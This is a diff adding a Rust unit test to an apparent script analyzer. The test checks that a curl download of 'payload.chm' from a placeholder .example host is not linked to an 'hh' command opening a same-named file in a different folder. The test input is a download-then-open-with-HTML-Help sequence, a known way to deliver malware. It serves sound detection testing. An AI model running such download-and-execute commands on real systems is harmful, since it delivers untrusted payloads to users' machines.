@@ -7783,6 +7783,27 @@ hh .\payload.chm"#,
     }
 
     #[test]
+    fn html_help_current_dir_nested_target_does_not_use_unrelated_basename_download() {
+        let report = crate::analyze(
+            br#"curl -o D:\Other\payload.chm https://hh-current-dir-wrong-basename.example/payload.chm
+hh .\Temp\payload.chm"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"hh .\Temp\payload.chm"#
+                            && url == "https://hh-current-dir-wrong-basename.example/payload.chm"
+                )
+            }),
+            "HTML Help current-dir nested target reused unrelated basename download: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn html_help_member_path_resolves_prior_download_source_url() {
         let report = crate::analyze(
             br#"curl -o payload.chm https://hh-member-source.example/payload.chm
